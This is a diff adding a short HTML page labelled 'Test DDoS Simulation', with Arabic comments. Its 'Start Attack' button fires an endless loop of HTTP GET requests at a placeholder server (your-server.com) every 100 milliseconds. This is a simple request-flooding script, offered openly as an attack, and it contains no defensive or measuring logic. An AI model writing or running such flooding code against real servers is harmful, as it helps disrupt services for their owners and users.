@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Test DDoS Simulation</title>
+    <script>
+        function startAttack() {
+            // يقوم هذا الكود بإرسال طلبات HTTP بشكل مستمر للخادم
+            setInterval(function() {
+                fetch('https://your-server.com', {
+                    method: 'GET',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                }).then(response => {
+                    console.log('Request sent');
+                }).catch(error => {
+                    console.log('Error:', error);
+                });
+            }, 100); // إرسال طلب كل 100 ميلي ثانية
+        }
+    </script>
+</head>
+<body>
+    <button onclick="startAttack()">Start Attack</button>
+</body>
+</html>
